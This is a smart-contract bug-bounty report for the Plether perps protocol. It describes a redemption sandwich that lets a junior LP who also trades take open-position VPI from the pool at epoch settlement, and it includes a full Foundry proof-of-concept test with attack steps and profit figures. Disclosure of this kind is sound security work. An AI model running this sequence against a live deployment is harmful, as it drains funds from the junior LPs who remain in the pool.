# \#98513 [SC-Critical] Junior redeemer takes collected open VPI from HousePool before the close pays it back

**Submitted on Nov 8th 2026 at 10:29:21 UTC by @blackmac for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98513
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An unprivileged account that holds junior shares and can trade can open a skew-increasing position, let HousePool price a queued junior redemption while that open VPI is still pool backing, and then close at the same mark. The pool pays the VPI back. On a flat book of 2,002,000 USDG the redeemer finishes 135.011477 USDG richer than the same redemption with no trade, and the junior LP who stays is worth 447.491479 USDG less. In production this takes backing from junior LPs who remain in the pool.

## Vulnerability Details

At constant depth, virtual price impact is the change in `k S^2 / (2D)`. A later close that returns skew to its start therefore computes a rebate equal to the open charge. `CloseAccountingLib.buildCloseState` clamps that delta only so lifetime VPI cannot go negative. At constant depth the raw round trip is already the negation of the open charge, so the clamp leaves the full accrued amount refundable. The comment on the clamp says "Prevents LP sandwich attacks" and then describes that other sandwich: open at high depth, shrink depth, and close for a rebate larger than the amount accrued. This report does not change depth, and the clamp does not stop it.

`SECURITY.md` "Exact symmetric LP NAV" (from line 849) says carry, VPI, and fees stay outside the pre-close price book, and that neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV. That sentence is about the marked price book and the negative-lifetime VPI reserve, which is trader collateral. It is not a redemption priced while collected open VPI is already in pool cash. "VPI limitations" says the lifetime clamp zeroes otherwise extractable rebate-only round trips. That is the trader's own round trip. The close-before-settlement control shows that round trip loses money. The gain here is the other junior LP's share of the open charge.

The open does not leave a matching liability on the junior price. `executeOpen` records the positive non-fee portion as claimant revenue:

```solidity
(int256 netMarginChange, uint256 protocolFeeCreditedAssets) = clearinghouse.applyOpenCost(
    delta.account,
    delta.marginDeltaAssets,
    delta.tradeCostAssets,
    host.pool(),
    host.protocolTreasury(),
    delta.executionFeeAssets
);
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

`CfdEngineSettlementSidecar.sol` lines 446–463. `CashArrived` increases `accountedAssets`. The HousePool reconcile snapshot has no positive-VPI field. Epoch settlement then prices the junior redemption from `juniorPrincipal` immediately after `_reconcile`:

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

`HousePool.sol` lines 835–841. Max liability and the settlement buffer limit how much cash the epoch can fund. They do not reduce assets paid per share. In live mode the LP settlement fee is zero:

```solidity
function _settlementFeeBps(bool isSenior, bool oracleFrozen) internal view returns (uint256) {
    if (!oracleFrozen) {
        return 0;
    }
    return isSenior ? poolConfig.seniorFrozenLpFeeBps : poolConfig.juniorFrozenLpFeeBps;
}
```

`HousePool.sol` lines 1147–1154.

The close then pays the rebate from pool cash that remains after trader claims. The junior holder who redeemed in the window has already taken a pro-rata share of the open charge. The junior LP who still holds shares bears the rebate.

`OrderRouter.settleLpEpoch` is permissionless (`OrderRouter.sol` line 479). The proof calls that function with a Pyth update. It does not impersonate the router.

The attacker is a junior LP and a trader. No owner, guardian, or pauser call is on the profit path. Release parameters: `vpiFactor` 0.01, `maxSkewRatio` 0.4, maintenance margin 10 bps, initial margin 20 bps, carry 500 bps, execution fee 4 bps, `maxSeniorShareBps` 8000, `adverseConfidenceMultiplierBps` 2,500. The open is 39% of live depth. The mark does not move. On the seed-only book the attacker holds about half of junior. Break-even on that book is `2f / V = 624.56 / 1,522.209015`, about 41% of junior, so half of junior clears it and a smaller stake does not. At 8,000,000 USDG of senior, the 80% covenant throttles the redemption and the attacker loses money.

Seed-only sequence, depth 2,002,000 USDG, mark 1.00, attacker `0xA77`, keeper `0xBEEF`:

1. The attacker deposits 1,000,000 USDG of junior, waits out the cooldown, and 60 seconds after an epoch boundary queues a redemption of the whole junior balance.
2. The attacker commits a long of 780,700 USDG notional. The keeper executes it on a later block. Accrued VPI is 1,522.209015 USDG, equal to `0.01 * S^2 / (2D)`.
3. The next epoch is settled at the same mark. Both the plain branch and the sandwich redeem `1000009798095910` junior shares. The sandwich pays 760.724402 USDG more assets. That premium equals the attacker's junior share times 1,522.209015 USDG.
4. The attacker closes at the same mark. Size goes to zero. The pool pays the VPI back, and the attacker withdraws remaining collateral.

The plain branch does steps 1 and 3 only, from the same snapshot. The negative control uses the same open, but closes before `router.settleLpEpoch`. This test leaves the position open across the epoch, about one hour. The ordering that matters is only that the open is executed before settlement and the close after it.

Runnable test: `packages/perps/test/perps/spec/lp/H306VpiNavRedeemSandwich.t.sol`. From `packages/perps`: `forge test --match-contract H306VpiNavRedeemSandwichTest -vv`. Commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. No in-scope contract was modified. Local Foundry, mock USDG and mock Pyth only. 6 passed, 0 failed.

## Impact Details

Selected impact: **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield**.

The lost USDG is backing of outstanding junior shares, not a separate unclaimed reward. "Theft of unclaimed yield" does not fit. "Griefing" does not fit, because below the senior cap the attacker finishes richer. The seed-only victim loss is 3.31 times the attacker gain. This program says griefing ratios change the amount paid, not the impact. "Protocol insolvency" and the freezing rows are not the end state: the close pays the rebate, and nothing is frozen.

Attacker wealth is wallet plus clearinghouse balance plus residual junior shares at `convertToAssets`. Amounts are USDG.

| Book | Attacker versus a plain redemption | Junior LP who stays |
| --- | ---: | ---: |
| Seed only, depth 2,002,000 | +135.011477 | −447.491479 |
| Senior 2,000,000 | +271.193995 | −895.679074 |
| Senior 4,000,000 | +406.894108 | −1,343.384264 |
| Senior 8,000,000, at the 80% cap | −2,341.704329 | not a loss |

On the seed-only book both branches redeem the same share count. Pool cash −447.491477, treasury +312.280000 (one 4 bps fee on 780,700), keeper +0.200000. Those four cash deltas sum to 0. The senior-4,000,000 cash-only attacker line of +2,688.592513 is not the ending wealth, because the two branches redeem different share counts. The +406.894108 figure includes the residual shares.

Closing before settlement, on the same seed-only snapshot, leaves attacker wealth 469.276663 USDG below the plain redemption. The sandwich redemption exceeds that close-first redemption by 604.084273 USDG. The epoch boundary is what creates the gain.

The seed-only attacker result decomposes as redemption premium +760.724402, two execution fees −624.560000, keeper bounties −0.200000, and carry −0.952925, net +135.011477. The carry is two `CarryRealized` events on the sandwich branch, 952,388 atoms when settlement checkpoints carry and 537 atoms at the close.

The same seed-only sandwich with each component's Pyth confidence at 1 bp of the 1.00 mark, and `adverseConfidenceMultiplierBps` set to the release value 2,500, still profits. Attacker wealth is +105.692350 USDG and the junior LP who stays loses 418.164545 USDG. The open VPI is 1,522.132906 USDG. The fixture default multiplier is 2,000, so this run does not use that default. Confidence 0 remains the zero-confidence case above. One basis point does not remove the gain.

At the release senior-share cap the same sequence loses money. A book already at that cap is not this theft. The code is not deployed on mainnet. The program says bugs in that code are valid where the project has stated it will be deployed without further changes, and that any scaling element of the reward is scaled to the minimum.

## References

- Commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`
- `packages/perps/src/CfdEngineSettlementSidecar.sol` lines 446–463
- `packages/perps/src/HousePool.sol` lines 835–841 and 1147–1154
- `packages/perps/src/libraries/CloseAccountingLib.sol` lines 103–118
- `packages/perps/src/OrderRouter.sol` line 479
- `packages/perps/SECURITY.md`, "Exact symmetric LP NAV" and "VPI limitations"
- `packages/perps/src/PletherOracle.sol` `_adverseOrderPrice`, lines 905–923, and the default `adverseConfidenceMultiplierBps` of 2,000 at line 95. The release value in `DEPLOYMENT.md` is 2,500
- `packages/perps/DEPLOYMENT.md` release parameters: `vpiFactor` 0.01, `maxSkewRatio` 0.4, execution fee 4 bps, `maxSeniorShareBps` 8000, `adverseConfidenceMultiplierBps` 2,500


## Proof of Concept

## Proof of Concept

Local Foundry test at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. No in-scope contract is modified. Mock USDG and mock Pyth updates replace components outside the in-scope contracts. No fork, no RPC, and no mainnet or public-testnet transaction.

Place `H306VpiNavRedeemSandwich.t.sol` at:

`packages/perps/test/perps/spec/lp/H306VpiNavRedeemSandwich.t.sol`

From `packages/perps`:

```
forge test --match-contract H306VpiNavRedeemSandwichTest -vv
```

Result: 6 passed, 0 failed, 0 skipped.

The test uses release parameters: `vpiFactor` 0.01, `maxSkewRatio` 0.4, maintenance margin 10 bps, initial margin 20 bps, carry 500 bps, execution fee 4 bps, `maxSeniorShareBps` 8000. Mark is 1.00 and does not move. Attacker is `0xA77`. Keeper is `0xBEEF`. The victim is the test contract, which already holds the initial junior deposit. The open is 39% of live pool depth. Settlement is `router.settleLpEpoch`, which is permissionless. The position in these tests stays open across the epoch. The ordering that matters is only that the open is executed before that call and the close after it.

Five tests publish Pyth confidence 0. `test_H306_SeedOnly_OneBpConfidence` sets each component's confidence to 1 bp of the 1.00 mark and sets `adverseConfidenceMultiplierBps` to the release value 2,500. The oracle default is 2,000. On that run the seed-only attacker wealth is +105.692350 USDG and the junior LP who stays loses 418.164545 USDG.

On the zero-confidence seed-only book the attacker holds about half of junior. Break-even is `2f / V = 624.56 / 1,522.209015`, about 41% of junior.

### Seed-only attack

Depth is 2,002,000 USDG. This is `test_H306_SeniorSeedOnly` and the sandwich branch of `test_H306_CloseBeforeSettlementRemovesTheCapture`.

1. Fund the attacker with 1,000,000 USDG of junior shares and wait out the one-hour deposit cooldown. Sit 60 seconds after an epoch boundary, which is inside the five-minute request cutoff.
2. The attacker calls `juniorVault.requestRedeem` for the whole junior balance. The request matures at the next epoch. No position is open, so this step has no price exposure.
3. The attacker calls `router.commitOrder` for a long of 780,700 USDG notional. The keeper calls `router.executeOrder` on a later block, at mark 1.00. The position's accrued VPI is 1,522.209015 USDG, equal to `0.01 * S^2 / (2D)`. That cash is recorded as HousePool revenue. Nothing reserves it as refundable.
4. Warp across the epoch boundary and refresh the mark at the same price. Settle the LP epoch. `_reconcile` runs, then the junior redemption is priced from `juniorPrincipal`. Both this branch and a plain redemption of the same shares redeem `1000009798095910` shares. The sandwich pays 760.724402 USDG more assets than the plain redemption. That premium equals the attacker's share of junior times 1,522.209015 USDG.
5. The attacker calls `juniorVault.redeem` for the funded shares, then commits and the keeper executes a full close of the same long at mark 1.00. Position size goes to zero. The lifetime clamp leaves the full accrued VPI refundable, and the pool pays it back. The attacker withdraws the remaining clearinghouse balance.

The plain branch repeats steps 1, 2, and 4 only, from the same snapshot. It does not open or close.

### Measured end state

Attacker wealth is the wallet, plus the clearinghouse balance, plus any residual junior shares at `convertToAssets`. On this book both branches redeem the same share count.

| | Attacker wealth | Junior LP who stays | Redemption assets |
| --- | ---: | ---: | ---: |
| Plain redemption | 2,000,999.981729 | 1,000,999.305908 | 999,999.981729 |
| Sandwich | 2,001,134.993206 | 1,000,551.814429 | 1,000,760.706131 |
| Difference | +135.011477 | −447.491479 | +760.724402 |

Pool cash falls 447.491477 USDG. Treasury rises 312.280000 USDG, which is one 4 bps execution fee on 780,700 USDG. The keeper rises 0.200000 USDG. Attacker, pool, treasury, and keeper cash deltas sum to 0.

The same test also runs the sandwich with extra senior and compares each one with its own plain redemption:

| Senior funded | Attacker wealth versus plain | Junior LP who stays |
| --- | ---: | ---: |
| 2,000,000 | +271.193995 | −895.679074 |
| 4,000,000 | +406.894108 | −1,343.384264 |
| 8,000,000, at the 80% cap | −2,341.704329 | not a loss |

At 4,000,000 senior the two branches do not redeem the same share count. The ending wealth above includes the residual shares. A cash-only comparison on that row is not the result.

### Negative control

`test_H306_CloseBeforeSettlementRemovesTheCapture` repeats the seed-only open, then closes at the same mark before `settleLpEpoch`. The open still charges 1,522.209015 USDG of VPI. Settlement then prices the redemption after that rebate has already left the pool.

Attacker wealth is 2,000,530.705066 USDG, which is 469.276663 USDG below the plain redemption. The sandwich redemption exceeds this close-first redemption by 604.084273 USDG. The test asserts that the close-first attacker is not richer than the plain redemption, and that USDG is conserved. Removing the epoch boundary between the open and the close removes the profit.

### Test

`packages/perps/test/perps/spec/lp/H306VpiNavRedeemSandwich.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console2} from "forge-std/console2.sol";

/// @notice H-306. Positive open VPI is paid to the pool and booked immediately as LP revenue, yet a later
///         skew-reducing close rebates it back out of the pool (the lifetime clamp allows a rebate up to the
///         accrued amount). Nothing reserves a liability for that refundable amount, so junior NAV is inflated
///         for as long as the position stays open.
///
///         A junior LP who is also a trader queues a redemption, opens a skew-increasing position just before the
///         LP epoch boundary, lets the epoch settle at the inflated junior NAV, then closes and recovers the VPI.
///         The junior LPs who stay fund the redeemer's share.
///
///         Every case reconciles against a full USDG-conservation ledger. The open is always sized from live pool
///         depth, so no result is an artifact of a hand-picked notional.
contract H306VpiNavRedeemSandwichTest is BasePerpTest {

    address internal constant ATK = address(0xA77);
    address internal constant SENIOR_LP = address(0x5E0);
    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant MARK = 1e8;
    uint256 internal constant ATK_JUNIOR = 1_000_000e6;

    /// @dev Percent of depth the attacker's open targets. The configured skew cap is 40%.
    uint256 internal constant SKEW_TARGET_PCT = 39;

    uint256 internal atkSize;
    uint256 internal atkMargin;
    uint256 internal redeemedShares;
    uint256 internal redeemedAssets;
    /// @dev Pyth component confidence. Zero except the explicit one-basis-point run.
    uint64 internal pythConfidence;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        // Release parameters from packages/perps/DEPLOYMENT.md.
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        params.baseCarryBps = 500;
    }

    // ---------------------------------------------------------------------
    // Senior share drives the magnitude. maxSeniorShareBps = 8000 throughout.
    // ---------------------------------------------------------------------

    /// @dev Senior at its seed only (junior-dominated pool).
    function test_H306_SeniorSeedOnly() public {
        _scenario(0, true);
    }

    /// @dev Senior ~= junior (senior ~50% of the pool).
    function test_H306_SeniorHalf() public {
        _scenario(2_000_000e6, true);
    }

    /// @dev Senior ~67% of the pool: just inside the 80% covenant, where junior withdrawal room still covers the
    ///      attacker's whole stake. Worst case found.
    function test_H306_SeniorJustUnderCovenant() public {
        _scenario(4_000_000e6, true);
    }

    /// @dev Senior at ~80% of the pool, i.e. at the covenant cap. `juniorWithdrawalRatioCap` collapses to roughly
    ///      zero, the redemption is throttled to dust, and the attacker ends worse off. Documents the boundary.
    function test_H306_SeniorAtCovenantCap_Blocked() public {
        _scenario(8_000_000e6, false);
    }

    /// @dev Seed-only sandwich with each component's Pyth confidence at 1 bp of the 1.00 mark, and the release
    ///      adverse multiplier of 2,500. The fixture default is 2,000, which would understate the fill shift.
    function test_H306_SeedOnly_OneBpConfidence() public {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2_500;
        // Propose now so this timelock and the senior-cap timelock inside `_scenario` elapse together.
        // A separate 72-hour warp lands on Sunday and freezes deposits.
        routerAdmin.proposeRouterConfig(config);
        pythConfidence = 10_000;
        _scenario(0, true);
    }

    /// @dev Negative control. The same open still charges VPI, but the close rebates it before `settleLpEpoch`
    ///      reconciles and prices the redemption. Removing that ordering removes the capture.
    function test_H306_CloseBeforeSettlementRemovesTheCapture() public {
        _armJuniorBook();
        uint256 snap = vm.snapshotState();
        (uint256 plainWealth, uint256 plainVictim, uint256 plainAssets, uint256 plainTotal) = _measure(false, false);
        vm.revertToState(snap);
        uint256 sandwichAssets = _assertSandwichBeatsPlain(plainWealth, plainVictim, plainAssets, plainTotal);
        vm.revertToState(snap);
        _assertCloseFirstDoesNotCapture(plainWealth, plainTotal, sandwichAssets);
    }

    function _armJuniorBook() internal {
        _setSeniorCapacity(TEST_MAX_SENIOR_EXPOSURE_ASSETS, 8000);
        _fundJunior(ATK, ATK_JUNIOR);

        uint256 depth = pool.totalAssets();
        atkSize = ((depth * SKEW_TARGET_PCT / 100) * 1e12 / 1e20) * 1e20;
        atkMargin = depth / 10;
        _fundTrader(ATK, depth / 2);

        _warpForward(2 hours);
        uint256 epochStart = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        vm.warp(epochStart + 60);
        router.updateMarkPrice(_pyth());
    }

    function _measure(
        bool attack,
        bool closeBeforeSettlement
    ) internal returns (uint256 wealth, uint256 victim, uint256 assets, uint256 total) {
        Ledger memory led;
        (wealth, victim, led) = _runBranch(attack, closeBeforeSettlement);
        assets = redeemedAssets;
        total = led.total;
    }

    function _assertSandwichBeatsPlain(
        uint256 plainWealth,
        uint256 plainVictim,
        uint256 plainAssets,
        uint256 plainTotal
    ) internal returns (uint256 assets) {
        uint256 wealth;
        uint256 victim;
        uint256 total;
        (wealth, victim, assets, total) = _measure(true, false);
        console2.log("plain redemption assets   ", plainAssets);
        console2.log("sandwich redemption assets", assets);
        console2.log("plain attacker wealth     ", plainWealth);
        console2.log("sandwich attacker wealth  ", wealth);
        console2.log("plain victim junior       ", plainVictim);
        console2.log("sandwich victim junior    ", victim);
        assertEq(total, plainTotal, "USDG conserved on the sandwich");
        assertGt(assets, plainAssets, "sandwich redemption pays more than the plain redemption");
        assertGt(wealth, plainWealth, "sandwich leaves the attacker richer");
        assertLt(victim, plainVictim, "staying junior LP funds the sandwich");
    }

    function _assertCloseFirstDoesNotCapture(
        uint256 plainWealth,
        uint256 plainTotal,
        uint256 sandwichAssets
    ) internal {
        (uint256 wealth,, uint256 assets, uint256 total) = _measure(true, true);
        console2.log("close-first redemption assets", assets);
        console2.log("close-first attacker wealth  ", wealth);
        assertEq(total, plainTotal, "USDG conserved on the control");
        assertGt(sandwichAssets, assets, "settlement while VPI is outstanding pays a larger redemption");
        assertLe(wealth, plainWealth, "closing before settlement removes the capture");
    }

    // ---------------------------------------------------------------------

    struct Ledger {
        uint256 total; // conserved sum over every USDG holder
        uint256 pool; // HousePool raw token
        uint256 treasury; // protocol treasury clearinghouse balance
        uint256 keeper; // keeper wallet + clearinghouse balance
        uint256 attacker; // attacker wallet + clearinghouse balance
    }

    function _scenario(
        uint256 seniorAssets,
        bool expectProfitable
    ) internal {
        if (seniorAssets != 0) {
            _fundSenior(SENIOR_LP, seniorAssets);
        }
        _setSeniorCapacity(TEST_MAX_SENIOR_EXPOSURE_ASSETS, 8000);
        if (pythConfidence != 0) {
            routerAdmin.finalizeRouterConfig();
            assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2_500, "release adverse multiplier");
        }

        // Attacker becomes a junior LP alongside the pre-existing 1M junior held by address(this).
        _fundJunior(ATK, ATK_JUNIOR);

        // Derive the open from live depth and fund margin proportionally.
        uint256 depth = pool.totalAssets();
        atkSize = ((depth * SKEW_TARGET_PCT / 100) * 1e12 / 1e20) * 1e20;
        atkMargin = depth / 10;
        _fundTrader(ATK, depth / 2);

        console2.log("pool depth            ", depth);
        console2.log("attacker open notional", atkSize / 1e12);

        // Clear the deposit cooldown, then sit just after an epoch boundary.
        _warpForward(2 hours);
        uint256 epochStart = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        vm.warp(epochStart + 60);
        router.updateMarkPrice(_pyth());

        uint256 snap = vm.snapshotState();

        (uint256 baseAtk, uint256 baseVictim, Ledger memory baseLed) = _runBranch(false, false);
        uint256 baseRedeemed = redeemedShares;

        vm.revertToState(snap);

        (uint256 atkAtk, uint256 atkVictim, Ledger memory atkLed) = _runBranch(true, false);

        console2.log("junior shares redeemed, baseline", baseRedeemed);
        console2.log("junior shares redeemed, attack  ", redeemedShares);
        console2.log("--- attacker wealth (wallet + clearinghouse + residual junior) ---");
        console2.log("baseline", baseAtk);
        console2.log("attack  ", atkAtk);
        console2.log("--- remaining victim junior NAV ---");
        console2.log("baseline", baseVictim);
        console2.log("attack  ", atkVictim);

        _printReconciliation(baseLed, atkLed);
        assertEq(atkLed.total, baseLed.total, "USDG conserved across both branches");

        if (expectProfitable) {
            assertGt(atkAtk, baseAtk, "attacker ends with more USDG than a plain redemption");
            assertLt(atkVictim, baseVictim, "remaining junior LP is worth less");
            assertLt(atkLed.pool, baseLed.pool, "pool funds the extraction");
        } else {
            assertLe(atkAtk, baseAtk, "covenant blocks the extraction");
        }
    }

    /// @dev Signed delta (attack - baseline) of every tracked sink. These net to zero.
    function _printReconciliation(
        Ledger memory b,
        Ledger memory a
    ) internal pure {
        console2.log("=== reconciliation: signed delta (attack - baseline) ===");
        _logDelta("attacker  ", int256(a.attacker) - int256(b.attacker));
        _logDelta("pool      ", int256(a.pool) - int256(b.pool));
        _logDelta("treasury  ", int256(a.treasury) - int256(b.treasury));
        _logDelta("keeper    ", int256(a.keeper) - int256(b.keeper));
        int256 others = (int256(a.total) - int256(a.attacker) - int256(a.pool) - int256(a.treasury) - int256(a.keeper))
            - (int256(b.total) - int256(b.attacker) - int256(b.pool) - int256(b.treasury) - int256(b.keeper));
        _logDelta("all others", others);
    }

    function _logDelta(
        string memory name,
        int256 d
    ) internal pure {
        if (d < 0) {
            console2.log(name, "-", uint256(-d));
        } else {
            console2.log(name, "+", uint256(d));
        }
    }

    function _runBranch(
        bool attack,
        bool closeBeforeSettlement
    ) internal returns (uint256 attackerWealth, uint256 victimJuniorAssets, Ledger memory led) {
        uint256 shares = juniorVault.balanceOf(ATK);
        vm.prank(ATK);
        juniorVault.requestRedeem(shares, ATK, ATK);

        if (attack) {
            vm.prank(ATK);
            uint64 openId = router.commitOrder(CfdTypes.Side.LONG, atkSize, atkMargin, 0, false);
            _keeperExecute(openId);
            (,,,,,, int256 accrued) = engine.positions(ATK);
            console2.log("attacker open VPI accrued", uint256(accrued));
            assertGt(accrued, 0, "open charges VPI");
            if (closeBeforeSettlement) {
                _closeAttack();
            }
        }

        // Cross the epoch boundary and settle at the unchanged mark through the permissionless router.
        // Settlement reverts with HousePool__NoLpEpochProgress when the covenant blocks the only queued work;
        // that block is the result being documented in the at-cap case, so tolerate it.
        uint256 nextEpoch = (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
        vm.warp(nextEpoch + 1);
        try router.settleLpEpoch(_pyth()) {} catch {}

        uint256 claimable = juniorVault.maxRedeem(ATK);
        redeemedShares = claimable;
        redeemedAssets = 0;
        if (claimable != 0) {
            vm.prank(ATK);
            redeemedAssets = juniorVault.redeem(claimable, ATK, ATK);
        }

        if (attack && !closeBeforeSettlement) {
            _closeAttack();
        }

        uint256 bal = clearinghouse.balanceAssets(ATK);
        if (bal != 0) {
            vm.prank(ATK);
            clearinghouse.withdrawMargin(bal);
        }
        // Include any residual junior shares at their post-attack NAV. Without this, a branch that happens to
        // convert more shares into cash looks richer even when the conversion was at a fair price.
        attackerWealth = settlementToken.balanceOf(ATK) + clearinghouse.balanceAssets(ATK)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATK))
            + juniorVault.convertToAssets(juniorVault.balanceOf(address(juniorVault)));
        victimJuniorAssets = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        led = _snapshotLedger();
    }

    function _closeAttack() internal {
        vm.prank(ATK);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, atkSize, 0, type(uint256).max, true);
        _keeperExecute(closeId);
        (uint256 size,,,,,,) = engine.positions(ATK);
        assertEq(size, 0, "attacker closed at the same mark");
    }

    function _snapshotLedger() internal view returns (Ledger memory led) {
        led.pool = settlementToken.balanceOf(address(pool));
        led.treasury = clearinghouse.balanceAssets(engine.protocolTreasury());
        led.keeper = settlementToken.balanceOf(KEEPER) + clearinghouse.balanceAssets(KEEPER);
        led.attacker = settlementToken.balanceOf(ATK) + clearinghouse.balanceAssets(ATK);

        address[8] memory holders = [
            ATK,
            SENIOR_LP,
            KEEPER,
            address(this),
            address(pool),
            address(clearinghouse),
            address(juniorVault),
            address(seniorVault)
        ];
        uint256 sum;
        for (uint256 i = 0; i < holders.length; ++i) {
            sum += settlementToken.balanceOf(holders[i]);
        }
        led.total = sum;
    }

    /// @dev A third-party keeper executes, so bounties never reach the attacker or the victim.
    function _keeperExecute(
        uint64 orderId
    ) internal {
        bytes[] memory data = _pyth();
        vm.prank(KEEPER);
        router.executeOrder(orderId, data);
    }

    /// @dev Same shape as `BasePerpTest._mockPythUpdateData`, with this test's component confidence.
    function _pyth() internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(MARK)),
            pythConfidence,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(MARK);
    }

}
```

